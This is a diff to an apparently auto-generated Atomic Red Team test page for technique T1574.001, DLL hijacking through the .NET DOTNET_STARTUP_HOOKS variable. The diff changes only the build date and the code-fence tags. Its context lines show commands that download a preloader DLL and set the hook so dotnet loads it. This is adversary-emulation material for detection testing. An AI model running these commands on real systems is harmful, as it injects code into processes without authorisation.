@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1574.001"
 attack_technique_name: "Hijack Execution Flow: DLL"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "d322cdd7-7d60-46e3-9111-648848da7c02"
@@ -57,13 +57,13 @@ Utilizing the dotnet_startup_hooks environment variable, this method allows for 
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "C:\Program Files\dotnet\dotnet.exe") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null
 echo.
 ```
@@ -72,13 +72,13 @@ preloader must exist
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{preloader_dll}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/preloader.dll?raw=true" -OutFile "#{preloader_dll}"
 ```
 
@@ -88,7 +88,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/at
 
 ### Command
 
-```commandprompt
+```cmd
 set DOTNET_STARTUP_HOOKS="#{preloader_dll}"
 dotnet -h > nul
 echo.
@@ -96,7 +96,7 @@ echo.
 
 ### Cleanup
 
-```commandprompt
+```cmd
 taskkill /F /IM #{process_name} >nul 2>&1
 ```
 
